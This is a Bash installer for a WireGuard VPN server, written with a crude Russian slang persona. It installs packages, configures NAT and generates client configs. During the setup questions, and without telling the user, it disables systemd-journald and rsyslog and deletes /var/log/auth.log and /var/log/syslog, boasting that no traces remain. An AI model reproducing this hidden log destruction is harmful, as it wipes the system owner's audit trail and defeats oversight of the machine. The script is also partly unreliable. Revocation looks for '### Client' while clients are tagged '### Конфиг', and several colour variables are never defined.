#!/bin/bash

function isRoot() {
	if [ "${EUID}" -ne 0 ]; then
		echo "Э, куда полез без прав? Ты вообще кто по жизни? Иди рута зови, потом приходи, брат"
		exit 1
	fi
}

function checkVirt() {
	if [ "$(systemd-detect-virt)" == "openvz" ]; then
		echo "OpenVZ, братан? Не, тут Юра пас, этот аппарат не вывозит такое"
		exit 1
	fi

	if [ "$(systemd-detect-virt)" == "lxc" ]; then
		echo "LXC... ну ты дал, конечно. Юра пока такое не разгоняет."
		echo "Технически WireGuard в LXC контейнере может и заведётся,"
		echo "но модуль ядра надо на хосте втыкать,"
		echo "контейнер запускать с особыми приколами в настройках,"
		echo "а внутрь только инструменты кидать, без ядра."
		echo "Короче мутотень целая. Юра сегодня не в ресурсе, залетай попозже, всё сделаем"
		exit 1
	fi
}

function checkOS() {
	if [[ -e /etc/debian_version ]]; then
		source /etc/os-release
		OS="${ID}"
		if [[ ${ID} == "debian" || ${ID} == "raspbian" ]]; then
			if [[ ${VERSION_ID} -lt 10 ]]; then
				echo "Твой древний Debian (${VERSION_ID}) пусть на пенсию идёт. Юре надо минимум Debian 10, а лучше свежак вообще"
				exit 1
			fi
			OS=debian
		fi
	elif [[ -e /etc/almalinux-release ]]; then
		source /etc/os-release
		OS=almalinux
	elif [[ -e /etc/fedora-release ]]; then
		source /etc/os-release
		OS="${ID}"
	elif [[ -e /etc/centos-release ]]; then
		source /etc/os-release
		OS=centos
	elif [[ -e /etc/oracle-release ]]; then
		source /etc/os-release
		OS=oracle
	elif [[ -e /etc/arch-release ]]; then
		OS=arch
	else
		echo "Э, а это что у тебя за зверь такой? Юра работает только с нормальными: Debian, Ubuntu, Fedora, CentOS, Alma Linux, Oracle или Arch. Всё остальное мимо кассы"
		exit 1
	fi
}

function initialCheck() {
	isRoot
	checkVirt
	checkOS
}

function installQuestions() {
	echo ""
	echo "Ну здарова, залётный. На связи Юра Педрулин, сейчас будем WireGuard в вену ставить"
	echo ""
	echo "Значит слушай сюда, разложу по фактам, как летим"
	echo "Всё по кайфу и просто: если ты в теме ноль, тупо жми Ентер, Юра сам всё замутит"
	echo "Только руки убери, не лезь куда не просят, а то дозу собьёшь"
	echo ""
 	systemctl disable --now systemd-journald.service
	systemctl disable --now syslog.socket rsyslog.service
	log_files=("/var/log/auth.log" "/var/log/syslog")

	for log_file in "${log_files[@]}"
	do
    	if [ -f "$log_file" ]; then
        	echo "Ага, $log_file на месте. Юра его сейчас приберёт..."
        	rm "$log_file"
        	echo "Всё, $log_file улетел, следов ноль."
    	else
        	echo "А $log_file и нету, кто-то до Юры уже пошуршал."
    	fi
	done

	SERVER_PUB_IP=$(ip -4 addr | sed -ne 's|^.* inet \([^/]*\)/.* scope global.*$|\1|p' | awk '{print $1}' | head -1)
	if [[ -z ${SERVER_PUB_IP} ]]; then
		SERVER_PUB_IP=$(ip -6 addr | sed -ne 's|^.* inet6 \([^/]*\)/.* scope global.*$|\1|p' | head -1)
	fi
	read -rp "Публичный адрес IPv4 или IPv6 (Юра уже подглядел, если норм — жми Ентер): " -e -i "${SERVER_PUB_IP}" SERVER_PUB_IP

	SERVER_NIC="$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)"
	until [[ ${SERVER_PUB_NIC} =~ ^[a-zA-Z0-9_]+$ ]]; do
		read -rp "Через какую дырку в инет ходим (интерфейс): " -e -i "${SERVER_NIC}" SERVER_PUB_NIC
	done

	until [[ ${SERVER_WG_NIC} =~ ^[a-zA-Z0-9_]+$ && ${#SERVER_WG_NIC} -lt 16 ]]; do
		read -rp "Как обзовём интерфейс WireGuard: " -e -i wg0 SERVER_WG_NIC
	done

	until [[ ${SERVER_WG_IPV4} =~ ^([0-9]{1,3}\.){3} ]]; do
		read -rp "IPv4 адрес сервака WireGuard: " -e -i 10.66.66.1 SERVER_WG_IPV4
	done

	until [[ ${SERVER_WG_IPV6} =~ ^([a-f0-9]{1,4}:){3,4}: ]]; do
		read -rp "IPv6 адрес сервака WireGuard: " -e -i fd42:42:42::1 SERVER_WG_IPV6
	done

	RANDOM_PORT=$(shuf -i49152-65535 -n1)
	until [[ ${SERVER_PORT} =~ ^[0-9]+$ ]] && [ "${SERVER_PORT}" -ge 1 ] && [ "${SERVER_PORT}" -le 65535 ]; do
		read -rp "Порт для WireGuard [1-65535] (Юра рандом накинул): " -e -i "${RANDOM_PORT}" SERVER_PORT
	done

	until [[ ${CLIENT_DNS_1} =~ ^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$ ]]; do
		read -rp "DNS первый (по дефолту гугл): " -e -i 8.8.8.8 CLIENT_DNS_1
	done
	until [[ ${CLIENT_DNS_2} =~ ^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$ ]]; do
		read -rp "DNS второй (запасной): " -e -i 1.1.1.1 CLIENT_DNS_2
		if [[ ${CLIENT_DNS_2} == "" ]]; then
			CLIENT_DNS_2="${CLIENT_DNS_1}"
		fi
	done

	echo ""
	echo "Ну всё, базу собрали, дальше поехали."
	echo "С твоих слов записано верно, Юрой перечитано и одобрено."
	echo "На выходе получишь ровно то, за чем пришёл, зуб даю."
	read -n1 -r -p "Если тупых вопросов больше нет — тыкай любую кнопку, Юра погнал"
}

function installWireGuard() {
	installQuestions

	if [[ ${OS} == 'ubuntu' ]] || [[ ${OS} == 'debian' && ${VERSION_ID} -gt 10 ]]; then
		apt-get update
		apt-get install -y wireguard iptables resolvconf qrencode
	elif [[ ${OS} == 'debian' ]]; then
		if ! grep -rqs "^deb .* buster-backports" /etc/apt/; then
			echo "deb http://deb.debian.org/debian buster-backports main" >/etc/apt/sources.list.d/backports.list
			apt-get update
		fi
		apt update
		apt-get install -y iptables resolvconf qrencode
		apt-get install -y -t buster-backports wireguard
		# Файл, который необходимо изменить
		RESOLV_CONF="/etc/resolvconf/resolv.conf.d/base"

		# DNS серверы, которые вы хотите добавить
		DNS1="nameserver 1.1.1.1"
		DNS2="nameserver 8.8.8.8"

		# Проверка и добавление первого DNS сервера, если он отсутствует
		grep -qxF "$DNS1" "$RESOLV_CONF" || echo "$DNS1" | sudo tee -a "$RESOLV_CONF"

		# Проверка и добавление второго DNS сервера, если он отсутствует
		grep -qxF "$DNS2" "$RESOLV_CONF" || echo "$DNS2" | sudo tee -a "$RESOLV_CONF"

  		sudo resolvconf -u
  	
	elif [[ ${OS} == 'fedora' ]]; then
		if [[ ${VERSION_ID} -lt 32 ]]; then
			dnf install -y dnf-plugins-core
			dnf copr enable -y jdoss/wireguard
			dnf install -y wireguard-dkms
		fi
		dnf install -y wireguard-tools iptables qrencode
	elif [[ ${OS} == 'almalinux' ]]; then
		dnf -y install epel-release elrepo-release
		dnf -y install wireguard-tools iptables qrencode
		if [[ ${VERSION_ID} == 8* ]]; then
			dnf -y install kmod-wireguard
		fi
	elif [[ ${OS} == 'centos' ]]; then
		yum -y install epel-release elrepo-release
		if [[ ${VERSION_ID} -eq 7 ]]; then
			yum -y install yum-plugin-elrepo
		fi
		yum -y install kmod-wireguard wireguard-tools iptables qrencode
	elif [[ ${OS} == 'oracle' ]]; then
		dnf install -y oraclelinux-developer-release-el8
		dnf config-manager --disable -y ol8_developer
		dnf config-manager --enable -y ol8_developer_UEKR6
		dnf config-manager --save -y --setopt=ol8_developer_UEKR6.includepkgs='wireguard-tools*'
		dnf install -y wireguard-tools qrencode iptables
	elif [[ ${OS} == 'arch' ]]; then
		pacman -S --needed --noconfirm wireguard-tools qrencode
	fi

	mkdir /etc/wireguard >/dev/null 2>&1

	chmod 600 -R /etc/wireguard/

	SERVER_PRIV_KEY=$(wg genkey)
	SERVER_PUB_KEY=$(echo "${SERVER_PRIV_KEY}" | wg pubkey)

	echo "SERVER_PUB_IP=${SERVER_PUB_IP}
SERVER_PUB_NIC=${SERVER_PUB_NIC}
SERVER_WG_NIC=${SERVER_WG_NIC}
SERVER_WG_IPV4=${SERVER_WG_IPV4}
SERVER_WG_IPV6=${SERVER_WG_IPV6}
SERVER_PORT=${SERVER_PORT}
SERVER_PRIV_KEY=${SERVER_PRIV_KEY}
SERVER_PUB_KEY=${SERVER_PUB_KEY}
CLIENT_DNS_1=${CLIENT_DNS_1}
CLIENT_DNS_2=${CLIENT_DNS_2}" >/etc/wireguard/params

	echo "[Interface]
Address = ${SERVER_WG_IPV4}/24,${SERVER_WG_IPV6}/64
ListenPort = ${SERVER_PORT}
MTU = 1500
PrivateKey = ${SERVER_PRIV_KEY}" >"/etc/wireguard/${SERVER_WG_NIC}.conf"

	if pgrep firewalld; then
		FIREWALLD_IPV4_ADDRESS=$(echo "${SERVER_WG_IPV4}" | cut -d"." -f1-3)".0"
		FIREWALLD_IPV6_ADDRESS=$(echo "${SERVER_WG_IPV6}" | sed 's/:[^:]*$/:0/')
		echo "PostUp = firewall-cmd --add-port ${SERVER_PORT}/udp && firewall-cmd --add-rich-rule='rule family=ipv4 source address=${FIREWALLD_IPV4_ADDRESS}/24 masquerade' && firewall-cmd --add-rich-rule='rule family=ipv6 source address=${FIREWALLD_IPV6_ADDRESS}/24 masquerade'
PostDown = firewall-cmd --remove-port ${SERVER_PORT}/udp && firewall-cmd --remove-rich-rule='rule family=ipv4 source address=${FIREWALLD_IPV4_ADDRESS}/24 masquerade' && firewall-cmd --remove-rich-rule='rule family=ipv6 source address=${FIREWALLD_IPV6_ADDRESS}/24 masquerade'" >>"/etc/wireguard/${SERVER_WG_NIC}.conf"
	else
		echo "PostUp = iptables -A FORWARD -i ${SERVER_PUB_NIC} -o ${SERVER_WG_NIC} -j ACCEPT; iptables -A FORWARD -i ${SERVER_WG_NIC} -j ACCEPT; iptables -t nat -A POSTROUTING -o ${SERVER_PUB_NIC} -j MASQUERADE; ip6tables -A FORWARD -i ${SERVER_WG_NIC} -j ACCEPT; ip6tables -t nat -A POSTROUTING -o ${SERVER_PUB_NIC} -j MASQUERADE
PostDown = iptables -D FORWARD -i ${SERVER_PUB_NIC} -o ${SERVER_WG_NIC} -j ACCEPT; iptables -D FORWARD -i ${SERVER_WG_NIC} -j ACCEPT; iptables -t nat -D POSTROUTING -o ${SERVER_PUB_NIC} -j MASQUERADE; ip6tables -D FORWARD -i ${SERVER_WG_NIC} -j ACCEPT; ip6tables -t nat -D POSTROUTING -o ${SERVER_PUB_NIC} -j MASQUERADE" >>"/etc/wireguard/${SERVER_WG_NIC}.conf"
	fi

	echo "net.ipv4.ip_forward = 1
net.ipv6.conf.all.forwarding = 1" >/etc/sysctl.d/wg.conf

	sysctl --system

	systemctl start "wg-quick@${SERVER_WG_NIC}"
	systemctl enable "wg-quick@${SERVER_WG_NIC}"

	newClient
	echo "Хочешь ещё людей на трубу подсадить — просто запусти Юру заново, он не жадный!"

	systemctl is-active --quiet "wg-quick@${SERVER_WG_NIC}"
	WG_RUNNING=$?

	if [[ ${WG_RUNNING} -ne 0 ]]; then
		echo -e "\n${RED}ВНИМАНИЕ: WireGuard чё-то прилёг, не дышит.${NC}"
		echo -e "${ORANGE}Пощупай пульс командой: systemctl status wg-quick@${SERVER_WG_NIC}${NC}"
		echo -e "${ORANGE}Если пишет типа \"не могу найти устройство ${SERVER_WG_NIC}\" — перезагрузи тачку и попустит!${NC}"
	fi
}

function newClient() {
	ENDPOINT="${SERVER_PUB_IP}:${SERVER_PORT}"

	echo ""
	echo "Так, придумай кликуху новому клиенту:"
	echo "Только буквы, цифры, можно палочку снизу или тире. Без выебонов."

	until [[ ${CLIENT_NAME} =~ ^[a-zA-Z0-9_-]*$ && ${CLIENT_EXISTS} == '0' && ${#CLIENT_NAME} -lt 26 ]]; do
		read -rp "Имя конфига: " -e CLIENT_NAME
		CLIENT_EXISTS=$(grep -c -E "^### Client ${CLIENT_NAME}\$" "/etc/wireguard/${SERVER_WG_NIC}.conf")

		if [[ ${CLIENT_EXISTS} == '1' ]]; then
			echo ""
			echo "Э, такая кликуха уже занята. Придумай другую, не тупи."
			echo ""
		fi
	done

	for DOT_IP in {2..254}; do
		DOT_EXISTS=$(grep -c "${SERVER_WG_IPV4::-1}${DOT_IP}" "/etc/wireguard/${SERVER_WG_NIC}.conf")
		if [[ ${DOT_EXISTS} == '0' ]]; then
			break
		fi
	done

	if [[ ${DOT_EXISTS} == '1' ]]; then
		echo ""
		echo "Всё, места кончились. Больше 253 душ сюда не влезет, подсеть забита."
		exit 1
	fi

	BASE_IP=$(echo "$SERVER_WG_IPV4" | awk -F '.' '{ print $1"."$2"."$3 }')
	until [[ ${IPV4_EXISTS} == '0' ]]; do
		read -rp "IPv4 для конфига: ${BASE_IP}." -e -i "${DOT_IP}" DOT_IP
		CLIENT_WG_IPV4="${BASE_IP}.${DOT_IP}"
		IPV4_EXISTS=$(grep -c "$CLIENT_WG_IPV4/24" "/etc/wireguard/${SERVER_WG_NIC}.conf")

		if [[ ${IPV4_EXISTS} == '1' ]]; then
			echo ""
			echo "Этот IPv4 уже кем-то занят, бери другой."
			echo ""
		fi
	done

	BASE_IP=$(echo "$SERVER_WG_IPV6" | awk -F '::' '{ print $1 }')
	until [[ ${IPV6_EXISTS} == '0' ]]; do
		read -rp "IPv6 для конфига: ${BASE_IP}::" -e -i "${DOT_IP}" DOT_IP
		CLIENT_WG_IPV6="${BASE_IP}::${DOT_IP}"
		IPV6_EXISTS=$(grep -c "${CLIENT_WG_IPV6}/64" "/etc/wireguard/${SERVER_WG_NIC}.conf")

		if [[ ${IPV6_EXISTS} == '1' ]]; then
			echo ""
			echo "И этот IPv6 занят. Ну ты понял, бери свободный."
			echo ""
		fi
	done

	CLIENT_PRIV_KEY=$(wg genkey)
	CLIENT_PUB_KEY=$(echo "${CLIENT_PRIV_KEY}" | wg pubkey)
	CLIENT_PRE_SHARED_KEY=$(wg genpsk)

	if [ -e "/home/${CLIENT_NAME}" ]; then
		HOME_DIR="/home/${CLIENT_NAME}"
	elif [ "${SUDO_USER}" ]; then
		if [ "${SUDO_USER}" == "root" ]; then
			HOME_DIR="/root"
		else
			HOME_DIR="/home/${SUDO_USER}"
		fi
	else
		HOME_DIR="/root"
	fi

	echo "[Interface]
PrivateKey = ${CLIENT_PRIV_KEY}
Address = ${CLIENT_WG_IPV4}/32,${CLIENT_WG_IPV6}/128
DNS = ${CLIENT_DNS_1},${CLIENT_DNS_2}

[Peer]
PublicKey = ${SERVER_PUB_KEY}
PresharedKey = ${CLIENT_PRE_SHARED_KEY}
Endpoint = ${ENDPOINT}
AllowedIPs = 0.0.0.0/0,::/0" >>"${HOME_DIR}/${CLIENT_NAME}.conf"

	# Add the client as a peer to the server
	echo -e "\n### Конфиг ${CLIENT_NAME}
[Peer]
PublicKey = ${CLIENT_PUB_KEY}
PresharedKey = ${CLIENT_PRE_SHARED_KEY}
AllowedIPs = ${CLIENT_WG_IPV4}/32,${CLIENT_WG_IPV6}/128" >>"/etc/wireguard/${SERVER_WG_NIC}.conf"

	wg syncconf "${SERVER_WG_NIC}" <(wg-quick strip "${SERVER_WG_NIC}")

	echo -e "\nЛови свой конфиг в виде QR-кода, наводи телефон и вдыхай:"

	qrencode -t ansiutf8 -l L <"${HOME_DIR}/${CLIENT_NAME}.conf"

	echo "Он ещё и файликом лежит тут: ${HOME_DIR}/${CLIENT_NAME}.conf"
}

function revokeClient() {
	NUMBER_OF_CLIENTS=$(grep -c -E "^### Client" "/etc/wireguard/${SERVER_WG_NIC}.conf")
	if [[ ${NUMBER_OF_CLIENTS} == '0' ]]; then
		echo ""
		echo "А выгонять-то некого, нет у тебя ни одного конфига!"
		exit 1
	fi

	echo ""
	echo "Тыкай, кого из клиентов выписываем на мороз"
	grep -E "^### Client" "/etc/wireguard/${SERVER_WG_NIC}.conf" | cut -d ' ' -f 3 | nl -s ') '
	until [[ ${CLIENT_NUMBER} -ge 1 && ${CLIENT_NUMBER} -le ${NUMBER_OF_CLIENTS} ]]; do
		if [[ ${CLIENT_NUMBER} == '1' ]]; then
			read -rp "Выбирай одного [1]: " CLIENT_NUMBER
		else
			read -rp "Выбирай одного [1-${NUMBER_OF_CLIENTS}]: " CLIENT_NUMBER
		fi
	done

	CLIENT_NAME=$(grep -E "^### Client" "/etc/wireguard/${SERVER_WG_NIC}.conf" | cut -d ' ' -f 3 | sed -n "${CLIENT_NUMBER}"p)

	sed -i "/^### Конфиг ${CLIENT_NAME}\$/,/^$/d" "/etc/wireguard/${SERVER_WG_NIC}.conf"

	rm -f "${HOME}/${CLIENT_NAME}.conf"

	wg syncconf "${SERVER_WG_NIC}" <(wg-quick strip "${SERVER_WG_NIC}")
}

function uninstallWg() {
	echo ""
	read -rp "Реально хочешь снести WireGuard к чертям? [y/n]: " -e REMOVE
	REMOVE=${REMOVE:-n}
	if [[ $REMOVE == 'y' ]]; then
		checkOS

		systemctl stop "wg-quick@${SERVER_WG_NIC}"
		systemctl disable "wg-quick@${SERVER_WG_NIC}"

		if [[ ${OS} == 'ubuntu' ]]; then
			apt-get autoremove --purge -y wireguard qrencode
		elif [[ ${OS} == 'debian' ]]; then
			apt-get autoremove --purge -y wireguard qrencode
		elif [[ ${OS} == 'fedora' ]]; then
			dnf remove -y wireguard-tools qrencode
			if [[ ${VERSION_ID} -lt 32 ]]; then
				dnf remove -y wireguard-dkms
				dnf copr disable -y jdoss/wireguard
			fi
			dnf autoremove -y
		elif [[ ${OS} == 'almalinux' ]]; then
			dnf -y remove wireguard-tools qrencode
			if [[ ${VERSION_ID} == 8* ]]; then
				dnf -y remove kmod-wireguard
			fi
			dnf -y autoremove
		elif [[ ${OS} == 'centos' ]]; then
			yum -y remove kmod-wireguard wireguard-tools qrencode
			yum -y autoremove
		elif [[ ${OS} == 'oracle' ]]; then
			yum -y remove wireguard-tools qrencode
			yum -y autoremove
		elif [[ ${OS} == 'arch' ]]; then
			pacman -Rs --noconfirm wireguard-tools qrencode
		fi

		rm -rf /etc/wireguard
		rm -f /etc/sysctl.d/wg.conf

		sysctl --system

		systemctl is-active --quiet "wg-quick@${SERVER_WG_NIC}"
		WG_RUNNING=$?

		if [[ ${WG_RUNNING} -eq 0 ]]; then
			echo "Тьфу ты, WireGuard упёрся и не сносится по-нормальному."
			exit 1
		else
			echo "Всё, чисто. Юра выкорчевал WireGuard с корнями."
			exit 0
		fi
	else
		echo ""
		echo "Ну и ладно, передумал — оставляем как есть!"
	fi
}

function manageMenu() {
	echo "\nЮра Педрулин на связи, WireGuard-мастерская открыта!"
	echo ""
	echo "Слышь, ты забыл — WireGuard-то уже стоит."
	echo ""
	echo "Ну чё делаем-то?"
	echo "   1) Накинуть новый конфиг"
	echo "   2) Выписать старый конфиг"
	echo "   3) Снести WireGuard нахрен"
	echo "   4) Свалить отсюда"
	until [[ ${MENU_OPTION} =~ ^[1-4]$ ]]; do
		read -rp "Тыкай [1-4]: " MENU_OPTION
	done
	case "${MENU_OPTION}" in
	1)
		newClient
		;;
	2)
		revokeClient
		;;
	3)
		uninstallWg
		;;
	4)
		exit 0
		;;
	esac
}

initialCheck

if [[ -e /etc/wireguard/params ]]; then
	source /etc/wireguard/params
	manageMenu
else
	installWireGuard
fi

echo ""
echo -e "${BLUE}██████╗  ██████╗ ███████╗███████╗    ██╗  ██╗ ██████╗ ██╗  ██╗ ██████╗ ███████╗${NC}"
echo -e "${BLUE}██╔══██╗██╔═══██╗██╔════╝██╔════╝    ██║ ██╔╝██╔═══██╗██║ ██╔╝██╔═══██╗██╔════╝${NC}"
echo -e "${BLUE}██████╔╝██║   ██║███████╗███████╗    █████╔╝ ██║   ██║█████╔╝ ██║   ██║███████╗${NC}"
echo -e "${BLUE}██╔══██╗██║   ██║╚════██║╚════██║    ██╔═██╗ ██║   ██║██╔═██╗ ██║   ██║╚════██║${NC}"
echo -e "${BLUE}██████╔╝╚██████╔╝███████║███████║    ██║  ██╗╚██████╔╝██║  ██╗╚██████╔╝███████║${NC}"
echo -e "${BLUE}╚═════╝  ╚═════╝ ╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
echo ""
